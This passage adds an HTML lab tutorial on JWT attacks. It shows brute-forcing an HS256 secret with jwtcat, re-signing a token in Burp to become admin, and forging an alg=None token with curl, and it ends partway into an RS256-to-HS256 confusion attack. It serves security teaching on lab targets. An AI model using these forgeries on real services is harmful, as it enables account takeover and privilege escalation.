@@ -1,0 +1,623 @@
+<h1 id="brute-force-jwt-secret">Brute Force JWT Secret</h1>
+<p>Assuming we have a valid JWT, we have both a payload and a valid
+signature for that payload. This means we can brute force various
+symmetric keys and compare the signature result to the known-valid
+signature. If we have a match, then we have discovered the symmetric key
+and can modify and forge JWTs at will.</p>
+<h2 id="server-setup">Server Setup</h2>
+<ol type="1">
+<li><p>Setup login server that generates JWT tokens</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker run <span class="at">--rm</span> <span class="at">-d</span> <span class="at">-p</span> 8081:8080 tarent/loginsrv <span class="at">-cookie-secure</span><span class="op">=</span>false <span class="at">-jwt-secret</span> my_secret <span class="at">-simple</span> mirage=password123 <span class="at">-login-path</span> / <span class="at">-jwt-algo</span> HS256</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">eb3c663d2a78d9692df04e3811a6a7800d0dc3557f495b66b02c19bc1c91c98a</span></span></code></pre></div>
+<p><em>Note:</em> Visit https://github.com/tarent/loginsrv to view
+configuration options.</p></li>
+<li><p>Login using valid credentials, as configured in step #1. For
+example, <strong>mirage</strong>::<strong>password123</strong></p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">--data</span> <span class="st">&quot;username=mirage&amp;password=password123&quot;</span> 127.0.0.1:8081/login</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtaXJhZ2UiLCJvcmlnaW4iOiJzaW1wbGUiLCJleHAiOjE2MTU3MTQ2Nzl9.hAyt0133WzJby99KtCFZLe2lPqHXVczY3sq2ksNpYGM</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-H</span> <span class="st">&quot;Cookie: jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtaXJhZ2UiLCJvcmlnaW4iOiJzaW1wbGUiLCJleHAiOjE2MTU3MTQ2Nzl9.hAyt0133WzJby99KtCFZLe2lPqHXVczY3sq2ksNpYGM&quot;</span> 127.0.0.1:8081/login</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>!DOCTYPE <span class="ex">html</span><span class="op">&gt;</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>html<span class="op">&gt;</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>h1<span class="op">&gt;</span>Welcome <span class="ex">mirage!</span><span class="op">&lt;</span>/h1<span class="op">&gt;</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>br/<span class="op">&gt;</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>/html<span class="op">&gt;</span></span></code></pre></div></li>
+<li><p>Analyze the generated JWT token on https://jwt.io/</p>
+<figure>
+<img src="./image/2021-03-13_03-05_jwt_io.png"
+alt="JWT token analysis" />
+<figcaption aria-hidden="true">JWT token analysis</figcaption>
+</figure></li>
+</ol>
+<h2 id="attack-exercise">Attack Exercise</h2>
+<p>Can you login as an admin user, just by tampering the JWT token?
+Start here –&gt; http://127.0.0.1:8081/login</p>
+<figure>
+<img src="./image/2021-03-13_15-09_login_ui.png" alt="Login UI" />
+<figcaption aria-hidden="true">Login UI</figcaption>
+</figure>
+<h2 id="solution-steps">Solution Steps</h2>
+<h3 id="token-analysis">Token Analysis</h3>
+<ol type="1">
+<li><p>Login using known credentials (non-admin), e.g.,
+<strong>mirage</strong>::<strong>password123</strong></p>
+<figure>
+<img src="./image/2021-03-13_15-35_logged_in.png"
+alt="Logged in as non-admin user" />
+<figcaption aria-hidden="true">Logged in as non-admin user</figcaption>
+</figure></li>
+<li><p>Right-click on the Web page, and select <code>Inspect</code> to
+open the Developer Tools in your browser window. In Chrome browser,
+click on <strong>Application</strong> tab, and select
+<strong>Cookies</strong> &gt;
+<strong>http://127.0.0.1:8081/</strong></p>
+<figure>
+<img src="./image/2021-03-13_15-44_cookie.png" alt="Cookies" />
+<figcaption aria-hidden="true">Cookies</figcaption>
+</figure></li>
+<li><p>Copy the <strong>JWT_token</strong> value,
+e.g. <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtaXJhZ2UiLCJvcmlnaW4iOiJzaW1wbGUiLCJleHAiOjE2MTU3MTU0ODF9.cnuHrXb-YrIqgpL3lLaGg8p-KedzSATrshcT2zzbF2c</code></p></li>
+<li><p>Navigate to https://jwt.io/ and paste the encoded JWT token
+value</p></li>
+<li><p>Analyse the base64 decoded content</p>
+<figure>
+<img src="./image/2021-03-13_16-03_jwt_io.png"
+alt="Base64 decoded content" />
+<figcaption aria-hidden="true">Base64 decoded content</figcaption>
+</figure></li>
+</ol>
+<h3 id="install-and-use-jwtcat-tool">Install and Use “jwtcat” tool</h3>
+<ol type="1">
+<li><p>Clone <a href="https://github.com/aress31/jwtcat">jwtcat</a>
+repository</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/AresS31/jwtcat</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> jwtcat</span></code></pre></div></li>
+<li><p>Create a Python virtual environment and install
+<code>jwtcat</code>’s dependencies</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">virtualenv</span> venv</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="bu">source</span> ./venv/bin/activate</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> <span class="at">-m</span> pip install <span class="at">-r</span> requirements.txt</span></code></pre></div></li>
+<li><p>Create a wordlist of <a
+href="./artifact/jwt-secret-keys-wordlist.txt">possible secret keys</a>.
+Store this list in a file, say,
+<code>jwt-secret-keys-wordlist.txt</code></p></li>
+<li><p>Run the following commands</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">venv</span><span class="kw">)</span> <span class="ex">$</span> python jwtcat.py wordlist <span class="at">-h</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">venv</span><span class="kw">)</span> <span class="ex">$</span> python jwtcat.py wordlist <span class="at">-w</span> jwt-secret-keys-wordlist.txt <span class="st">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtaXJhZ2UiLCJvcmlnaW4iOiJzaW1wbGUiLCJleHAiOjE2MTU3MTQ2Nzl9.hAyt0133WzJby99KtCFZLe2lPqHXVczY3sq2ksNpYGM&quot;</span></span></code></pre></div>
+<p><strong>Syntax:</strong>
+<code>bash  python jwtcat.py wordlist -w &lt;PATH_to_WORDLIST&gt; &lt;JWT_TOKEN_VALUE&gt;</code></p>
+<figure>
+<img src="./image/2021-03-13_18-55_secret_key_found.png"
+alt="Secret key found" />
+<figcaption aria-hidden="true">Secret key found</figcaption>
+</figure></li>
+</ol>
+<h3 id="key-validation-using-burp-suites-extension">Key Validation using
+Burp Suite’s Extension</h3>
+<ol type="1">
+<li><p>Open <a
+href="https://portswigger.net/burp/communitydownload">Burp Suite
+Community Edition</a> proxy tool</p>
+<ol type="1">
+<li><p>Choose <strong>Temporary project</strong> &gt; <strong>Use Burp
+defaults</strong> &gt; <strong>Start Burp</strong></p>
+<p><img src="./image/2021-03-13_16-11_burp_suite_community.png"
+alt="Burp Suite: Temporary project" /> <img
+src="./image/2021-03-13_16-13_start_burp.png"
+alt="Burp Suite: Use Burp defaults" /></p></li>
+<li><p>Setup <strong>proxy listener</strong> on port
+<strong>7777</strong></p>
+<figure>
+<img src="./image/2021-03-13_16-16_set_proxy_listener.png"
+alt="Proxy listener" />
+<figcaption aria-hidden="true">Proxy listener</figcaption>
+</figure></li>
+<li><p>Configure your <strong>browser proxy settings</strong> to route
+all traffic to Burp Suite</p>
+<figure>
+<img src="./image/2021-03-13_16-28_browser_proxy_Setting.png"
+alt="Chrome browser proxy settings" />
+<figcaption aria-hidden="true">Chrome browser proxy
+settings</figcaption>
+</figure></li>
+</ol></li>
+<li><p>Add an entry in <strong>/etc/hosts</strong> file:
+<code>127.0.0.1    nullcon2021</code></p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> vim /etc/hosts</span></code></pre></div>
+<figure>
+<img src="./image/2021-03-13_16-44_host_entry.png" alt="Host entry" />
+<figcaption aria-hidden="true">Host entry</figcaption>
+</figure>
+<p>Save the changes by typing <code>:wq</code></p></li>
+<li><p>Navigate to http://nullcon2021:8081/</p></li>
+<li><p>Enter valid (non-admin) user credentials and press
+<strong>Login</strong> button</p>
+<figure>
+<img src="./image/2021-03-13_16-53_intercepted_login.png"
+alt="Intercepted login request" />
+<figcaption aria-hidden="true">Intercepted login request</figcaption>
+</figure>
+<p>Notice that the request was captured in Burp Suite’s
+<strong>Proxy</strong> tool</p></li>
+<li><p><strong>Turn off intercept</strong> mode to allow all browser
+traffic to pass through Burp, and navigate to <strong>Proxy</strong>
+&gt; <strong>HTTP history</strong> tab</p></li>
+<li><p>Download <a
+href="https://portswigger.net/bappstore/bapps/download/f923cbf91698420890354c1d8958fee6">JSON
+Web Tokens</a> Burp Suite extension file</p></li>
+<li><p>In Burp Suite, navigate to <strong>Extender</strong> &gt;
+<strong>BApp Store</strong></p></li>
+<li><p>Click on <strong>Manual Install</strong> button, and select the
+downloaded extension file, i.e.,
+<code>f923cbf91698420890354c1d8958fee6.bapp</code></p>
+<figure>
+<img src="./image/2021-03-13_17-31_json_web_tokens.png"
+alt="Install extension manually" />
+<figcaption aria-hidden="true">Install extension manually</figcaption>
+</figure>
+<p>Notice that a new tab called <strong>JSON Web Tokens</strong> appears
+in Burp Suite</p></li>
+<li><p>Switch to the <strong>Proxy</strong> tab in Burp Suite</p></li>
+<li><p>Locate the <strong>authenticated GET request</strong> made to
+endpoint http://nullcon2021:8081/</p>
+<figure>
+<img src="./image/2021-03-13_17-00_authenticated_request.png"
+alt="Authenticated GET request" />
+<figcaption aria-hidden="true">Authenticated GET request</figcaption>
+</figure></li>
+<li><p>Right-click on the request in <strong>Proxy</strong> tab, and
+select “Send to Repeater” option from context menu to send this request
+to Repeater tool</p>
+<figure>
+<img src="./image/2021-03-13_17-50_repeater.png"
+alt="Request sent to Repeater" />
+<figcaption aria-hidden="true">Request sent to Repeater</figcaption>
+</figure></li>
+<li><p>Click on “<strong>JSON Web Tokens</strong>” sub-tab</p></li>
+<li><p>Change the payload by modifying the value of
+“<strong>sub</strong>” field to <code>admin</code></p></li>
+<li><p>Select “<strong>Recalculate Signature</strong>” option</p></li>
+<li><p>Enter <code>my_secret</code> in the input box titled “Secret/Key
+for Signature recalculation”</p>
+<figure>
+<img src="./image/2021-03-13_18-04_recalculate_signature.png"
+alt="Signature Recalculation" />
+<figcaption aria-hidden="true">Signature Recalculation</figcaption>
+</figure></li>
+<li><p>Click on “<strong>Go</strong>” button</p></li>
+<li><p>Check the server response</p>
+<figure>
+<img src="./image/2021-03-13_18-20_server_response.png"
+alt="Logged in as admin" />
+<figcaption aria-hidden="true">Logged in as admin</figcaption>
+</figure></li>
+<li><p>Click on “<strong>Render</strong>” tab in
+<strong>Response</strong> section</p>
+<figure>
+<img src="./image/2021-03-13_18-21_render_response.png"
+alt="Render server response" />
+<figcaption aria-hidden="true">Render server response</figcaption>
+</figure></li>
+</ol>
+<h2 id="references">References</h2>
+<ul>
+<li>https://github.com/tarent/loginsrv</li>
+<li>https://trustfoundry.net/jwt-hacking-101/</li>
+<li>https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/</li>
+<li>https://github.com/aress31/jwtcat</li>
+<li>https://github.com/lmammino/jwt-cracker</li>
+</ul>
+<h1 id="none-algorithm">None Algorithm</h1>
+<h2 id="fetch-jwt-token">Fetch JWT Token</h2>
+<ol type="1">
+<li><p>Navigate to https://authlab.digi.ninja/JWT_None</p></li>
+<li><p>Right-click on the Web page, select “<strong>Inspect</strong>”
+option from the context menu, and go to “<strong>Network</strong>”
+tab</p></li>
+<li><p>Click on the “<strong>Validate Token</strong>” button</p>
+<figure>
+<img src="./image/none-alg/2021-03-13_03-05_jwt_none.png"
+alt="Obtain JWT token" />
+<figcaption aria-hidden="true">Obtain JWT token</figcaption>
+</figure></li>
+<li><p>Copy the JWT token from authorization header of request made to
+endpoint https://authlab.digi.ninja/JWT_None_Check,
+e.g. <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.oYPuxIPnm6lYx3Zx_8zaMGVw7Np5nZtgJVnaMqlZcOQ</code></p></li>
+<li><p>Navigate to https://jwt.io/</p></li>
+<li><p>Paste the copied JWT token, i.e.,
+<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.oYPuxIPnm6lYx3Zx_8zaMGVw7Np5nZtgJVnaMqlZcOQ</code></p>
+<figure>
+<img src="./image/none-alg/2021-03-14_15-35_original_jwt.png"
+alt="Original JWT" />
+<figcaption aria-hidden="true">Original JWT</figcaption>
+</figure></li>
+<li><p>Modify JWT header by changing value of “<strong>alg</strong>”
+field to “<strong>None</strong>”</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo <span class="st">&#39;{ &quot;alg&quot;: &quot;None&quot;, &quot;typ&quot;: &quot;JWT&quot; }&#39;</span> <span class="kw">|</span> <span class="fu">base64</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="va">eyAiYWxnIjogIk5vbmUiLCAidHlwIjogIkpXVCIgfQo</span><span class="op">=</span></span></code></pre></div>
+<p><em>Note:</em> The trailing “equals to” (<code>=</code>) symbols
+should be ignored while creating the final JWT token.</p></li>
+<li><p>Modify JWT payload by changing value of “<strong>level</strong>”
+field to “<strong>admin</strong>”</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo <span class="st">&#39;{ &quot;user&quot;: &quot;robin&quot;, &quot;level&quot;: &quot;admin&quot; }&#39;</span> <span class="kw">|</span> <span class="fu">base64</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="va">eyAidXNlciI6ICJyb2JpbiIsICJsZXZlbCI6ICJhZG1pbiIgfQo</span><span class="op">=</span></span></code></pre></div>
+<figure>
+<img src="./image/none-alg/2021-03-14_15-49_modify_payload_only.png"
+alt="Modify payload only" />
+<figcaption aria-hidden="true">Modify payload only</figcaption>
+</figure>
+<p><em>Note:</em> The trailing “equals to” (<code>=</code>) symbols
+should be ignored while creating the final JWT token.</p></li>
+<li><p>Create new JWT token using <strong>new header</strong> and
+<strong>payload</strong> values. Drop the signature part (but leave the
+dots in place).</p>
+<p><strong>New JWT token:</strong>
+<code>eyAiYWxnIjogIk5vbmUiLCAidHlwIjogIkpXVCIgfQo.eyAidXNlciI6ICJyb2JpbiIsICJsZXZlbCI6ICJhZG1pbiIgfQo.</code></p>
+<figure>
+<img src="./image/none-alg/2021-03-14_16-06_payload.png"
+alt="The attack payload" />
+<figcaption aria-hidden="true">The attack payload</figcaption>
+</figure></li>
+<li><p>Trigger a cURL request to the endpoint
+https://authlab.digi.ninja/JWT_None_Check, using the tampered JWT
+token</p>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl https://authlab.digi.ninja/JWT_None_Check <span class="at">-H</span> <span class="st">&quot;authorization: Bearer eyAiYWxnIjogIk5vbmUiLCAidHlwIjogIkpXVCIgfQo.eyAidXNlciI6ICJyb2JpbiIsICJsZXZlbCI6ICJhZG1pbiIgfQo.&quot;</span></span></code></pre></div>
+<figure>
+<img src="./image/none-alg/2021-03-14_16-10_attack_successful.png"
+alt="Successful attack result" />
+<figcaption aria-hidden="true">Successful attack result</figcaption>
+</figure>
+<figure>
+<img src="./image/none-alg/2021-03-14_16-13_post_attack_ui.png"
+alt="POst attack UI view" />
+<figcaption aria-hidden="true">POst attack UI view</figcaption>
+</figure></li>
+</ol>
+<h2 id="references-1">References</h2>
+<ul>
+<li>https://authlab.digi.ninja/JWT_None</li>
+<li>https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology</li>
+<li>https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771</li>
+<li>https://github.com/ticarpi/jwt_tool</li>
+<li>https://codeburst.io/the-only-nodejs-introduction-youll-ever-need-d969a47ef219</li>
+<li>https://github.com/ticarpi/jwt_tool/wiki/Known-Exploits-and-Attacks</li>
+</ul>
+<h1 id="rs256-to-hs256">RS256 to HS256</h1>
+<h2 id="setup">Setup</h2>
+<ol type="1">
+<li><p>Start a <a
+href="https://hub.docker.com/_/python?tab=tags&amp;page=1&amp;ordering=last_updated&amp;name=2.7.18">Python2.7.18</a>
+interpreter</p>
+<pre><code> $ docker pull python:2.7.18-stretch
+ $ docker run --network host -it python:2.7.18-stretch /bin/bash</code></pre>
+<figure>
+<img src="./image/rs256/2021-03-16_21-10_docker_python2.7.18.png"
+alt="Python2.7.18 interpreter" />
+<figcaption aria-hidden="true">Python2.7.18 interpreter</figcaption>
+</figure></li>
+<li><p>Install required Python modules</p>
+<pre><code> $ pip install PyJWT==1.0.1
+ $ pip install cryptography</code></pre>
+<figure>
+<img src="./image/rs256/2021-03-16_21-51_python_modules.png"
+alt="Install modules" />
+<figcaption aria-hidden="true">Install modules</figcaption>
+</figure></li>
+</ol>
+<h2 id="symmetric-algorithm-hs256">Symmetric Algorithm (HS256)</h2>
+<ol start="3" type="1">
+<li><p>Generate a JWT token and sign it using <strong>HS256</strong>
+(<strong>HMAC with SHA256</strong>) algorithm</p>
+<p><strong>Token Signing:</strong></p>
+<pre><code> &gt; import jwt
+ &gt; jwt.encode({&#39;some&#39;: &#39;payload&#39;}, &#39;secret&#39;, algorithm=&#39;HS256&#39;)
+ &#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.4twFt5NiznN84AWoo1d7KO1T_yoc0Z6XOpOVswacPZg&#39;</code></pre>
+<p>https://jwt.io/ <img
+src="./image/rs256/2021-03-16_22-07_hs256_jwt_io.png"
+alt="HS256 signed JWT token" /></p></li>
+<li><p>A Python server can verify the JWT token’s signature by calling
+<strong>jwt.decode()</strong> method</p>
+<p><strong>Signature Verification:</strong></p>
+<pre><code> &gt; jwt.decode(&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.4twFt5NiznN84AWoo1d7KO1T_yoc0Z6XOpOVswacPZg&#39;, &#39;secret&#39;, algorithms=&#39;HS256&#39;)
+ {u&#39;some&#39;: u&#39;payload&#39;}</code></pre>
+<figure>
+<img src="./image/rs256/2021-03-16_22-04_hs256.png"
+alt="Signature verification: HS256" />
+<figcaption aria-hidden="true">Signature verification:
+HS256</figcaption>
+</figure></li>
+</ol>
+<h2 id="asymmetric-algorithm-rs256">Asymmetric Algorithm (RS256)</h2>
+<ol start="5" type="1">
+<li><p>Exit the Python interpreter, and generate a public and private
+<strong>key-pair</strong> (without a passphrase)</p>
+<pre><code> &gt; quit()
+ $ ssh-keygen
+ $ ls -la /root/.ssh/
+ total 16
+ drwx------ 2 root root 4096 Mar 16 16:29 .
+ drwx------ 4 root root 4096 Mar 16 16:29 ..
+ -rw------- 1 root root 1675 Mar 16 16:29 id_rsa
+ -rw-r--r-- 1 root root  398 Mar 16 16:29 id_rsa.pub</code></pre>
+<figure>
+<img src="./image/rs256/2021-03-16_21-59_ssh-keygen.png"
+alt="Key-pair" />
+<figcaption aria-hidden="true">Key-pair</figcaption>
+</figure></li>
+<li><p>Reopen the python interpreter by typing <code>python</code>
+command on the console</p></li>
+<li><p>Generate a new JWT token but, this time, sign it using
+<strong>RS256</strong> (<strong>RSA signature with SHA256</strong>)
+algorithm</p>
+<p><strong>Token Signing:</strong></p>
+<pre><code> &gt; import jwt
+ &gt; priv = open(&#39;/root/.ssh/id_rsa&#39;,&#39;r&#39;).read()
+ &gt; jwt.encode({&#39;some&#39;: &#39;payload&#39;}, priv, algorithm=&#39;RS256&#39;)
+ &#39;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.UgVct7UlUecwrnIKWzy-e2LMR8mk9DmqycmCzBrvnCIjZs1IdWkqYL0izAbSzv2aBrtfZhn0JKuPqGvyw0CRIM41Tj3oUlJz5EUVbL3KptAYkPMCp7SmE4QphiYM9CurUwFnp-uoktYxXheTBpETPGj14QqefVvcHZfSx98vE5UsImEROIlr3Zk_FF9RlmGM9pHPGqtuLhJYY-PJwxFmxMuO6N-FjosDmlUt0PYRYqQ6pe_eszwzjxBa6CfsQxHfNy9IgBb1yXN1lvnaAgOn8cKmeRZ6dy0A1n9JGbSLwGTLnPfu_PYr4AEac2z94jP20BGCbLR7sIReMGSWdP1vlQ&#39;</code></pre>
+<figure>
+<img src="./image/rs256/2021-03-16_22-38_rs256.png"
+alt="RS256 signed JWT token" />
+<figcaption aria-hidden="true">RS256 signed JWT token</figcaption>
+</figure></li>
+<li><p>A Python server can verify the JWT token’s signature by calling
+<strong>jwt.decode()</strong> method</p>
+<ol type="1">
+<li><p>Extract the corresponding <strong>public key</strong> from the
+private key that was originally used to sign the JWT token</p>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cat ~/.ssh/id_rsa  <span class="kw">|</span> <span class="fu">sed</span> <span class="at">-e</span> <span class="st">&#39;s/^[ ]*//&#39;</span> <span class="kw">|</span> <span class="ex">openssl</span> rsa <span class="at">-pubout</span> <span class="op">&gt;</span> public.key</span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cat public.key </span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="ex">-----BEGIN</span> PUBLIC KEY-----</span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="ex">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxhlRXFrhbYezxHkUCmyH</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="ex">resyqlfsFmob2M6XXbMUKeeP5I9Mb1LCVmovz3qlAHQ/MMWPuqt91K+F0KS41tcG</span></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a><span class="ex">2mM/g3bXqB8+O2XoRFEH1IkMlP0VSm9awDlzsLkqVSnls+u8AisZJNVsEG4adQjT</span></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="ex">cT5AMnc6C3OyIMUZV053xdMtbwtisL1o5QFZ/nyxak2LjYhrg2nNfSooMneQWEJu</span></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a><span class="ex">U3+Y5OMasfvkSqbnJ7znveDIycgCDzqG5C7kwZjEgFiTZv3bD4L4ez77j0yPHoSj</span></span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a><span class="ex">mCO8XhOVuKagBJDHzUOc/bBiXLf/nk3ARGCcR0yHbgy5OWkVlRGinPdOkrvH9+YR</span></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a><span class="ex">nQIDAQAB</span></span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a><span class="ex">-----END</span> PUBLIC KEY-----</span></code></pre></div></li>
+<li><p>Verify JWT signature using the matching <strong>public
+key</strong></p>
+<p><strong>Signature Verification:</strong></p>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> python</span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> import <span class="ex">jwt</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> pub <span class="ex">=</span> open<span class="er">(</span><span class="st">&#39;public.key&#39;</span><span class="ex">,</span> <span class="st">&#39;r&#39;</span><span class="kw">)</span><span class="fu">.read()</span></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> jwt.decode<span class="kw">(</span><span class="st">&#39;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.UgVct7UlUecwrnIKWzy-e2LMR8mk9DmqycmCzBrvnCIjZs1IdWkqYL0izAbSzv2aBrtfZhn0JKuPqGvyw0CRIM41Tj3oUlJz5EUVbL3KptAYkPMCp7SmE4QphiYM9CurUwFnp-uoktYxXheTBpETPGj14QqefVvcHZfSx98vE5UsImEROIlr3Zk_FF9RlmGM9pHPGqtuLhJYY-PJwxFmxMuO6N-FjosDmlUt0PYRYqQ6pe_eszwzjxBa6CfsQxHfNy9IgBb1yXN1lvnaAgOn8cKmeRZ6dy0A1n9JGbSLwGTLnPfu_PYr4AEac2z94jP20BGCbLR7sIReMGSWdP1vlQ&#39;</span><span class="ex">,</span> pub, algorithms=<span class="pp">[</span><span class="st">&#39;HS256&#39;</span><span class="ss">,</span><span class="st">&#39;RS256&#39;</span><span class="pp">]</span><span class="kw">)</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="ex">{u</span><span class="st">&#39;some&#39;</span><span class="ex">:</span> u<span class="st">&#39;payload&#39;</span>}</span></code></pre></div>
+<figure>
+<img src="./image/rs256/2021-03-16_22-56_public_key_verify.png"
+alt="JWT verification using public key" />
+<figcaption aria-hidden="true">JWT verification using public
+key</figcaption>
+</figure></li>
+</ol></li>
+</ol>
+<h2 id="what-could-go-wrong">What Could Go Wrong?</h2>
+<p>If you choose to use: * Old (deprecate) modules/software * Custom
+software</p>
+<p>…then, things could go wrong from security perspective!</p>
+<p>If the server allows RS256 signature verification method, but HS256
+is also enabled, then an attacker can possibly tamper with the JWT
+token. In such a case, depending upon the JWT implementation, the
+attacker could send incorrect data to the server and could possibly
+impersonate as another (higher-privileged) user on the system.</p>
+<h2 id="how-to-attack">How to Attack</h2>
+<ol type="1">
+<li><p>In order for the attack to work, following two conditions must be
+satisfied</p>
+<ol type="1">
+<li>Server should be vulnerable</li>
+<li>A valid public key must have been leaked to the attacker</li>
+</ol></li>
+<li><p>Let’s start by analysing the following <strong>JWT token</strong>
+in https://jwt.io/</p>
+<pre><code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.UgVct7UlUecwrnIKWzy-e2LMR8mk9DmqycmCzBrvnCIjZs1IdWkqYL0izAbSzv2aBrtfZhn0JKuPqGvyw0CRIM41Tj3oUlJz5EUVbL3KptAYkPMCp7SmE4QphiYM9CurUwFnp-uoktYxXheTBpETPGj14QqefVvcHZfSx98vE5UsImEROIlr3Zk_FF9RlmGM9pHPGqtuLhJYY-PJwxFmxMuO6N-FjosDmlUt0PYRYqQ6pe_eszwzjxBa6CfsQxHfNy9IgBb1yXN1lvnaAgOn8cKmeRZ6dy0A1n9JGbSLwGTLnPfu_PYr4AEac2z94jP20BGCbLR7sIReMGSWdP1vlQ</code></pre>
+<p><em>Note:</em> JWT tokens can be obtained from cookies or
+request/response header/body</p>
+<figure>
+<img src="./image/rs256/2021-03-16_23-11_token_analysis.png"
+alt="JWT token analysis" />
+<figcaption aria-hidden="true">JWT token analysis</figcaption>
